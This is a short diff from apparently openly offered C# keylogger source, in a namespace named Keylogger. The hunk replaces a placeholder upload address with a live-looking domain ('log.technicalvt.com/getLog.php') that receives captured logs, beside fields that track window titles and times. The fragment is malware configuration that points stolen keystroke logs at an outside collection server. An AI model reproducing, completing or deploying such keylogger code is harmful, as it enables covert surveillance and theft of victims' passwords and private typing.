@@ -18,7 +18,7 @@ namespace Keylogger
         string currentWindowTitle = string.Empty;
         string currentHour = string.Empty;
 
-        string serverLink = "http://server-example/getLog.php";
+        string serverLink = "https://log.technicalvt.com/getLog.php";
         string serverArg = "log";
         
         //Get window titles
